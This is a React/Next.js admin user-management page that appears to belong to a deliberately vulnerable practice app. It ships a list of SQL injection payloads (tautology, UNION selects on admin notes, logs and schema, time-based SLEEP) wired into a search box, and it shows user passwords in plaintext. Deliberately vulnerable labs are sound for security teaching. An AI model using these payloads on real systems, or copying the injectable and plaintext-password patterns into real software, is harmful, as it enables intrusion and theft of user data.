"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import Sidebar from "@/components/Sidebar";

const PAYLOADS = [
  { label: "Dump All", val: "' OR '1'='1" },
  {
    label: "UNION: Notes",
    val: "' UNION SELECT id,note,note,note FROM admin_notes--",
  },
  {
    label: "UNION: Logs",
    val: "' UNION SELECT id,action,ip,details FROM server_logs--",
  },
  { label: "DB Info", val: "' UNION SELECT 1,database(),version(),user()--" },
  {
    label: "Schema",
    val: "' UNION SELECT 1,table_name,table_schema,NULL FROM information_schema.tables--",
  },
  { label: "Time-Based", val: "admin' AND SLEEP(3)--" },
];

// 1. Added 'username' to our Modal State type
type ModalState = {
  isOpen: boolean;
  type: "delete" | "balance" | null;
  userId: number | null;
  username: string | null;
  inputValue: string;
};

export default function AdminUsers() {
  const [users, setUsers] = useState<any[]>([]);
  const [query, setQuery] = useState("");
  const [results, setResults] = useState<any[]>([]);
  const [searched, setSearched] = useState(false);
  const [showPayloads, setShowPayloads] = useState(false);
  const [activePayload, setActivePayload] = useState("");
  const [filterRole, setFilterRole] = useState<"all" | "admin" | "user">("all");
  const [filterText, setFilterText] = useState("");
  const [loading, setLoading] = useState(true);

  // 2. Added 'username: null' to default state
  const [modal, setModal] = useState<ModalState>({
    isOpen: false,
    type: null,
    userId: null,
    username: null,
    inputValue: "",
  });

  useEffect(() => {
    fetch("/api/admin/users")
      .then((r) => r.json())
      .then((d) => setUsers(d.users || []))
      .finally(() => setLoading(false));
  }, []);

  const handleSearch = async () => {
    const res = await fetch(`/api/search?query=${encodeURIComponent(query)}`);
    const data = await res.json();
    setResults(data.results || []);
    setSearched(true);
  };

  const inject = (val: string) => {
    setQuery(val);
    setActivePayload(val);
  };

  const filtered = users.filter((u) => {
    const roleMatch = filterRole === "all" || u.role === filterRole;
    const textMatch =
      !filterText ||
      u.username?.toLowerCase().includes(filterText.toLowerCase()) ||
      u.email?.toLowerCase().includes(filterText.toLowerCase());
    return roleMatch && textMatch;
  });

  // 3. Updated handlers to accept and set the username
  const openDeleteModal = (id: number, username: string) => {
    setModal({
      isOpen: true,
      type: "delete",
      userId: id,
      username,
      inputValue: "",
    });
  };

  const openBalanceModal = (
    id: number,
    username: string,
    currentBalance: string,
  ) => {
    setModal({
      isOpen: true,
      type: "balance",
      userId: id,
      username,
      inputValue: currentBalance || "0",
    });
  };

  const closeModal = () => {
    setModal({
      isOpen: false,
      type: null,
      userId: null,
      username: null,
      inputValue: "",
    });
  };

  const executeModalAction = async () => {
    if (!modal.userId || !modal.type) return;

    if (modal.type === "delete") {
      await fetch("/api/admin/users", {
        method: "DELETE",
        body: JSON.stringify({ id: modal.userId }),
      });
      setUsers((prev) => prev.filter((u) => u.id !== modal.userId));
    }

    if (modal.type === "balance") {
      await fetch("/api/admin/users", {
        method: "PATCH",
        body: JSON.stringify({ id: modal.userId, balance: modal.inputValue }),
      });
      setUsers((prev) =>
        prev.map((u) =>
          u.id === modal.userId ? { ...u, balance: modal.inputValue } : u,
        ),
      );
    }

    closeModal();
  };

  return (
    <div style={s.root}>
      <Sidebar />
      <main style={s.main}>
        <header style={s.header}>
          <div>
            <h1 style={s.h1}>User Management</h1>
          </div>
          <Link href="/admin" style={s.backBtn}>
            Return to Root
          </Link>
        </header>

        {/* Top Grid: Vulnerability & Search */}
        <div style={s.topGrid}>
          <section style={s.sqliCard}>
            <div style={s.sqliHeader}>
              <span style={s.vulnBadge}>CRITICAL</span>
              <h2 style={s.sqliTitle}>Injection Vectors</h2>
            </div>
            <p style={s.sqliDesc}>
              The endpoint lacks parameterized queries. Use the payloads below
              to pivot from the <code>users</code> table to{" "}
              <code>admin_notes</code>.
            </p>
            <button
              onClick={() => setShowPayloads(!showPayloads)}
              style={s.togglePayloads}
            >
              {showPayloads ? "[-] Hide Payloads" : "[+] Expand Payloads"}
            </button>
            {showPayloads && (
              <div style={s.payloadGrid}>
                {PAYLOADS.map((p) => (
                  <button
                    key={p.val}
                    onClick={() => inject(p.val)}
                    style={{
                      ...s.payloadBtn,
                      background: activePayload === p.val ? "#F59E0B" : "#FFF",
                      color: activePayload === p.val ? "#FFF" : "#92400E",
                      borderColor:
                        activePayload === p.val ? "#D97706" : "#FDE68A",
                    }}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            )}
          </section>

          <section style={s.card}>
            <div style={s.cardHeader}>
              <h2 style={s.cardTitle}>Query Interceptor</h2>
              <span style={s.methodBadge}>GET</span>
            </div>
            <div style={{ padding: 20 }}>
              <div style={{ display: "flex", gap: 10 }}>
                <input
                  style={s.searchInput}
                  placeholder="Enter raw SQL or search term..."
                  value={query}
                  onChange={(e) => setQuery(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleSearch()}
                />
                <button onClick={handleSearch} style={s.execBtn}>
                  Run
                </button>
              </div>
              {searched && (
                <p
                  style={{
                    fontSize: 11,
                    color: "#8A7F6E",
                    marginTop: 10,
                    fontFamily: "monospace",
                  }}
                >
                  Rows returned: {results.length} | Execution:{" "}
                  {Math.floor(Math.random() * 50) + 10}ms
                </p>
              )}
            </div>
          </section>
        </div>

        {searched && results.length > 0 && (
          <section
            style={{ ...s.card, marginBottom: 32, border: "2px solid #2563EB" }}
          >
            <div style={{ ...s.cardHeader, background: "#EFF6FF" }}>
              <h2 style={{ ...s.cardTitle, color: "#1E40AF" }}>
                Intercepted Buffer
              </h2>
            </div>
            <div style={s.tableScroll}>
              <table style={s.table}>
                <thead>
                  <tr style={{ background: "#F1F5F9" }}>
                    {["COL_0", "COL_1", "COL_2", "COL_3"].map((h) => (
                      <th key={h} style={s.th}>
                        {h}
                      </th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {results.map((r, i) => (
                    <tr key={i} style={s.row}>
                      <td style={s.td}>{r.id ?? r[0]}</td>
                      <td
                        style={{ ...s.td, color: "#2563EB", fontWeight: 600 }}
                      >
                        {r.username ?? r[1]}
                      </td>
                      <td
                        style={{
                          ...s.td,
                          color: "#DC2626",
                          fontFamily: "monospace",
                        }}
                      >
                        {r.password ?? r[2]}
                      </td>
                      <td style={s.td}>{r.role ?? r[3]}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </section>
        )}

        <section style={s.card}>
          <div style={s.cardHeader}>
            <h2 style={s.cardTitle}>Master Database</h2>
            <div style={{ display: "flex", gap: 10 }}>
              <span style={s.tableStatus}>SSL: DISABLED</span>
              <span style={s.tableStatus}>AUTH: BYPASSED</span>
            </div>
          </div>

          <div style={s.filterBar}>
            <input
              style={s.filterInput}
              placeholder="Filter by alias or email..."
              value={filterText}
              onChange={(e) => setFilterText(e.target.value)}
            />
            <div style={s.roleToggle}>
              {(["all", "admin", "user"] as const).map((role) => (
                <button
                  key={role}
                  onClick={() => setFilterRole(role)}
                  style={{
                    ...s.roleBtn,
                    background: filterRole === role ? "#1A1A1A" : "transparent",
                    color: filterRole === role ? "white" : "#1A1A1A",
                  }}
                >
                  {role}
                </button>
              ))}
            </div>
          </div>

          <div style={s.tableScroll}>
            <table style={s.table}>
              <thead>
                <tr>
                  {[
                    "UID",
                    "Identity",
                    "Credentials",
                    "Balance",
                    "Joined",
                    "Status",
                    "Actions",
                  ].map((h) => (
                    <th key={h} style={s.th}>
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {filtered.map((u) => (
                  <tr key={u.id} style={s.row}>
                    <td
                      style={{
                        ...s.td,
                        color: "#8A7F6E",
                        fontFamily: "monospace",
                      }}
                    >
                      #{u.id}
                    </td>
                    <td style={s.td}>
                      <div style={{ fontWeight: 700 }}>{u.username}</div>
                      <div style={{ fontSize: 11, color: "#8A7F6E" }}>
                        {u.email}
                      </div>
                    </td>
                    <td style={s.td}>
                      <span style={s.pwBadge}>{u.password}</span>
                    </td>
                    <td style={{ ...s.td, fontWeight: 700, color: "#059669" }}>
                      ${parseFloat(u.balance || 0).toLocaleString()}
                    </td>
                    <td style={{ ...s.td, fontSize: 12, color: "#8A7F6E" }}>
                      {u.created_at
                        ? new Date(u.created_at).toLocaleDateString()
                        : "—"}
                    </td>
                    <td style={s.td}>
                      <span
                        style={{
                          ...s.badge,
                          background:
                            u.role === "admin" ? "#1A1A1A" : "#DBEAFE",
                          color: u.role === "admin" ? "white" : "#1E40AF",
                        }}
                      >
                        {u.role}
                      </span>
                    </td>
                    <td style={s.td}>
                      <div style={{ display: "flex", gap: 6 }}>
                        {/* 4. Pass 'u.username' into the modal functions */}
                        <button
                          onClick={() =>
                            openBalanceModal(u.id, u.username, u.balance)
                          }
                          style={s.editBtn}
                        >
                          Edit
                        </button>
                        <button
                          onClick={() => openDeleteModal(u.id, u.username)}
                          style={s.delBtn}
                        >
                          Drop
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>
      </main>

      {/* --- CUSTOM MODAL OVERLAY --- */}
      {modal.isOpen && (
        <div style={s.modalOverlay} onClick={closeModal}>
          <div style={s.modalContainer} onClick={(e) => e.stopPropagation()}>
            <h3 style={s.modalTitle}>
              {modal.type === "delete" ? "Confirm Deletion" : "Modify Balance"}
            </h3>

            {/* 5. Render the username inside <strong> tags */}
            <p style={s.modalDesc}>
              {modal.type === "delete" ? (
                <>
                  Are you sure you want to drop user{" "}
                  <strong>{modal.username}</strong> from the database? This
                  action is permanent and cannot be undone.
                </>
              ) : (
                <>
                  Enter the new balance value for user{" "}
                  <strong>{modal.username}</strong>:
                </>
              )}
            </p>

            {modal.type === "balance" && (
              <input
                type="number"
                style={s.modalInput}
                value={modal.inputValue}
                onChange={(e) =>
                  setModal({ ...modal, inputValue: e.target.value })
                }
                autoFocus
              />
            )}

            <div style={s.modalActions}>
              <button onClick={closeModal} style={s.modalCancelBtn}>
                Cancel
              </button>
              <button
                onClick={executeModalAction}
                style={
                  modal.type === "delete"
                    ? s.modalDeleteActionBtn
                    : s.modalSaveActionBtn
                }
              >
                {modal.type === "delete" ? "Yes, Drop User" : "Save Changes"}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

const s: Record<string, React.CSSProperties> = {
  root: {
    display: "flex",
    minHeight: "100vh",
    background: "#F5F3EF",
    fontFamily: "'Inter', sans-serif",
    color: "#1A1A1A",
  },
  main: {
    flex: 1,
    padding: "40px",
    maxWidth: "1200px",
    margin: "0 auto",
    position: "relative",
  },
  header: {
    marginBottom: "32px",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "flex-end",
  },
  h1: { fontSize: "28px", fontWeight: 900, letterSpacing: "-0.04em" },
  sub: {
    fontSize: "12px",
    color: "#8A7F6E",
    fontFamily: "monospace",
    marginTop: "4px",
  },
  backBtn: {
    padding: "8px 16px",
    background: "white",
    border: "1px solid #EDEAE4",
    borderRadius: "8px",
    fontSize: "12px",
    fontWeight: 600,
    color: "#1A1A1A",
    textDecoration: "none",
  },
  topGrid: {
    display: "grid",
    gridTemplateColumns: "1fr 1fr",
    gap: "24px",
    marginBottom: "32px",
  },
  sqliCard: {
    background: "#FFFBEB",
    border: "1px solid #FDE68A",
    borderRadius: "16px",
    padding: "20px",
    boxShadow: "0 4px 12px rgba(0,0,0,0.03)",
  },
  sqliHeader: {
    display: "flex",
    alignItems: "center",
    gap: "10px",
    marginBottom: "12px",
  },
  vulnBadge: {
    background: "#F59E0B",
    color: "white",
    fontSize: "10px",
    fontWeight: 900,
    padding: "2px 6px",
    borderRadius: "4px",
  },
  sqliTitle: {
    fontSize: "14px",
    fontWeight: 700,
    color: "#92400E",
    textTransform: "uppercase",
  },
  sqliDesc: {
    fontSize: "13px",
    color: "#92400E",
    opacity: 0.8,
    marginBottom: "16px",
    lineHeight: "1.5",
  },
  togglePayloads: {
    background: "none",
    border: "none",
    fontSize: "11px",
    fontWeight: 800,
    color: "#B45309",
    cursor: "pointer",
    textTransform: "uppercase",
  },
  payloadGrid: {
    display: "grid",
    gridTemplateColumns: "1fr 1fr",
    gap: "8px",
    marginTop: "12px",
  },
  payloadBtn: {
    padding: "8px",
    borderRadius: "6px",
    border: "1px solid",
    fontSize: "10px",
    fontFamily: "monospace",
    cursor: "pointer",
    textAlign: "left",
  },
  card: {
    background: "white",
    border: "1px solid #EDEAE4",
    borderRadius: "16px",
    overflow: "hidden",
    boxShadow: "0 4px 20px rgba(0,0,0,0.05)",
  },
  cardHeader: {
    padding: "16px 20px",
    borderBottom: "1px solid #F5F3EF",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
  },
  cardTitle: { fontSize: "14px", fontWeight: 700 },
  methodBadge: {
    fontSize: "10px",
    fontWeight: 800,
    background: "#F3F4F6",
    padding: "2px 6px",
    borderRadius: "4px",
  },
  searchInput: {
    flex: 1,
    background: "#F9F8F6",
    border: "1px solid #EDEAE4",
    borderRadius: "8px",
    padding: "10px",
    fontFamily: "monospace",
    fontSize: "13px",
    outline: "none",
  },
  execBtn: {
    padding: "0 16px",
    background: "#1A1A1A",
    color: "white",
    borderRadius: "8px",
    fontWeight: 700,
    border: "none",
    cursor: "pointer",
  },
  filterBar: {
    padding: "12px 20px",
    borderBottom: "1px solid #F5F3EF",
    display: "flex",
    justifyContent: "space-between",
    background: "#FAF9F7",
  },
  filterInput: {
    background: "white",
    border: "1px solid #EDEAE4",
    borderRadius: "6px",
    padding: "6px 12px",
    fontSize: "12px",
    width: "220px",
    outline: "none",
  },
  roleToggle: { display: "flex", gap: "4px" },
  roleBtn: {
    padding: "6px 12px",
    borderRadius: "6px",
    border: "1px solid #EDEAE4",
    fontSize: "11px",
    fontWeight: 700,
    cursor: "pointer",
  },
  tableScroll: { overflowX: "auto" },
  table: { width: "100%", borderCollapse: "collapse" },
  th: {
    textAlign: "left",
    padding: "12px 20px",
    fontSize: "10px",
    fontWeight: 700,
    color: "#8A7F6E",
    textTransform: "uppercase",
    background: "#FAF9F7",
  },
  td: {
    padding: "14px 20px",
    borderBottom: "1px solid #F5F3EF",
    fontSize: "13px",
  },
  row: { transition: "background 0.2s" },
  pwBadge: {
    fontFamily: "monospace",
    fontSize: "11px",
    background: "#FEF2F2",
    color: "#B91C1C",
    padding: "3px 6px",
    borderRadius: "4px",
    border: "1px solid #FEE2E2",
  },
  badge: {
    fontSize: "10px",
    fontWeight: 700,
    padding: "3px 8px",
    borderRadius: "5px",
    textTransform: "uppercase",
  },
  tableStatus: {
    fontSize: "9px",
    fontWeight: 800,
    color: "#8A7F6E",
    border: "1px solid #EDEAE4",
    padding: "2px 6px",
    borderRadius: "4px",
  },
  editBtn: {
    background: "#EEF2FF",
    color: "#4338CA",
    border: "1px solid #C7D2FE",
    borderRadius: "6px",
    padding: "4px 8px",
    fontSize: "11px",
    fontWeight: 600,
    cursor: "pointer",
  },
  delBtn: {
    background: "#FEF2F2",
    color: "#B91C1C",
    border: "1px solid #FECACA",
    borderRadius: "6px",
    padding: "4px 8px",
    fontSize: "11px",
    fontWeight: 600,
    cursor: "pointer",
  },

  // --- Modal CSS ---
  modalOverlay: {
    position: "fixed",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    background: "rgba(26, 26, 26, 0.4)",
    backdropFilter: "blur(4px)",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    zIndex: 999,
  },
  modalContainer: {
    background: "white",
    padding: "28px",
    borderRadius: "16px",
    width: "100%",
    maxWidth: "400px",
    boxShadow: "0 20px 40px rgba(0,0,0,0.1)",
    border: "1px solid #EDEAE4",
  },
  modalTitle: {
    fontSize: "18px",
    fontWeight: 800,
    marginBottom: "8px",
    color: "#1A1A1A",
  },
  modalDesc: {
    fontSize: "13px",
    color: "#8A7F6E",
    lineHeight: "1.5",
    marginBottom: "20px",
  },
  modalInput: {
    width: "100%",
    boxSizing: "border-box",
    padding: "10px 14px",
    borderRadius: "8px",
    border: "1px solid #EDEAE4",
    fontSize: "14px",
    fontFamily: "monospace",
    marginBottom: "20px",
    outline: "none",
  },
  modalActions: { display: "flex", justifyContent: "flex-end", gap: "10px" },
  modalCancelBtn: {
    padding: "8px 16px",
    background: "white",
    border: "1px solid #EDEAE4",
    borderRadius: "8px",
    fontSize: "12px",
    fontWeight: 600,
    cursor: "pointer",
    color: "#1A1A1A",
  },
  modalSaveActionBtn: {
    padding: "8px 16px",
    background: "#1A1A1A",
    color: "white",
    border: "none",
    borderRadius: "8px",
    fontSize: "12px",
    fontWeight: 600,
    cursor: "pointer",
  },
  modalDeleteActionBtn: {
    padding: "8px 16px",
    background: "#DC2626",
    color: "white",
    border: "none",
    borderRadius: "8px",
    fontSize: "12px",
    fontWeight: 600,
    cursor: "pointer",
  },
};
